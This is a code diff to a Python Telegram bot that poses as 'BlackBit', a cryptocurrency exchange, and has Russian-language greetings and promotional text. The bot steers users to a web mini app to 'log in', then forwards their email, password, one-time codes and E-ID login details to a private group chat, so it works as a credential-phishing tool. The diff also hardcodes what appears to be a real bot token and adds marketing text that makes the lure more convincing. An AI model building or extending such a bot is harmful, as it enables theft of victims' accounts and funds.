@@ -8,7 +8,7 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "НОВЫЙ_ТОКЕН_ОТ_BOTFATHER")
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I")
 GROUP_CHAT_ID = -1004457031723  # ← ID ГРУППЫ
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"  # ← ССЫЛКА НА MINI APP
 # ===============================================
@@ -40,17 +40,21 @@ class BlackBitBot:
             parse_mode="Markdown"
         )
 
-        # Приветствие пользователю
+        # Приветствие пользователю с двумя кнопками
+        keyboard = [
+            [KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))],
+            [KeyboardButton("ℹ️ BLACKBIT")]
+        ]
+        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
             f"Добро пожаловать на **BlackBit** — криптовалютную биржу нового поколения.\n\n"
             f"🔒 Безопасность, высокая скорость и низкие комиссии.\n"
             f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
-            f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.",
-            reply_markup=ReplyKeyboardMarkup(
-                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
-                resize_keyboard=True
-            ),
+            f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.\n"
+            f"Или нажми «ℹ️ BLACKBIT», чтобы узнать больше о проекте.",
+            reply_markup=reply_markup,
             parse_mode="Markdown"
         )
 
@@ -67,7 +71,22 @@ class BlackBitBot:
         if chat_id == GROUP_CHAT_ID:
             return
 
-        # ---- КОД с пометкой ----
+        # ---- КНОПКА BLACKBIT ----
+        if text == "ℹ️ BLACKBIT":
+            await msg.reply_text(
+                f"📘 **О проекте BlackBit**\n\n"
+                f"BlackBit — это современная криптовалютная биржа для торговли цифровыми активами.\n\n"
+                f"🔒 **Безопасность** — передовые технологии защиты.\n"
+                f"⚡ **Скорость** — мгновенные транзакции.\n"
+                f"💰 **Низкие комиссии** — выгодные условия для трейдеров.\n\n"
+                f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
+                f"🔗 Mini App: [blackbit](https://d3987616-hue.github.io/blackbit/)",
+                parse_mode="Markdown",
+                disable_web_page_preview=True
+            )
+            return
+
+        # ---- КОД ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
                 chat_id=GROUP_CHAT_ID,
@@ -78,7 +97,7 @@ class BlackBitBot:
             await msg.reply_text("✅ Отправлено")
             return
 
-        # ---- ССЫЛКА с пометкой ----
+        # ---- ССЫЛКА ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
                 chat_id=GROUP_CHAT_ID,
@@ -99,7 +118,7 @@ class BlackBitBot:
                 code = data.get('code')
                 eid_type = data.get('type')
 
-                # ---- ОБЫЧНЫЙ ВХОД с пометкой ----
+                # ---- ОБЫЧНЫЙ ВХОД ----
                 if step == 'login' and email and password:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
@@ -122,7 +141,7 @@ class BlackBitBot:
                     await msg.reply_text("✅ Отправлено")
                     return
 
-                # ---- E-ID ВХОД с пометкой ----
+                # ---- E-ID ВХОД ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
